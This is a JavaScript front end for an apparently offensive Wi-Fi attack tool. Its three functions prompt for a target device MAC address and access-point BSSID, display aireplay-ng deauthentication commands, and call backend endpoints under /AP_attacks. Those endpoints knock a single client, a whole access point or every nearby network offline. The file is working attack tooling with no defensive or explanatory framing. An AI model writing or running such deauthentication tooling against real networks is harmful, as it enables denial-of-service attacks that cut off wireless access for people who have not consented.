function run_deauth_host(){
    const target = prompt("Targets MAC address:");
    if (!target) {
        output.textContent += "Deauth canceled or no MAC address provided.\n";
        return;
    }
    
    const BSSID = prompt("Targets APs BSSID:");
    if (!BSSID) {
        output.textContent += "Deauth canceled or no SSID provided.\n";
        return;
    }

    output.textContent += `$ sudo sudo aireplay-ng --deauth 10 -a ${BSSID} -c ${target} wlan1mon\n`;

    fetch("/AP_attacks/deauth_host", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ host: target, bssid: BSSID })
    })

    let counter = 0;
    const interval = setInterval(() => {
        output.textContent += `Deauth of ${target} in progress...\n`;
        counter++;
        if (counter >= 10) clearInterval(interval);
    }, 2000);
}

function run_deauth_AP(){
    const BSSID = prompt("Targets APs BSSID:");
    if (!BSSID) {
        output.textContent += "Deauth canceled or no SSID provided.\n";
        return;
    }

    output.textContent += `$ sudo aireplay-ng --deauth 100 -a ${BSSID} wlan1mon\n`;

    fetch("/AP_attacks/deauth_AP", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ AP: BSSID })
    })
    
    let counter = 0;
    const interval = setInterval(() => {
        output.textContent += `Deauth of ${BSSID} AP in progress...\n`;
        counter++;
        if (counter >= 20) clearInterval(interval);
    }, 3000);
}

function run_deauth_all(){
    output.textContent += `$ sudo aireplay-ng --deauth 100 wlan1mon\n`;

    fetch("/AP_attacks/deauth_all")

    let counter = 0;
    const interval = setInterval(() => {
        output.textContent += `Deauth of all APs in progress...\n`;
        counter++;
        if (counter >= 30) clearInterval(interval);
    }, 3000);
}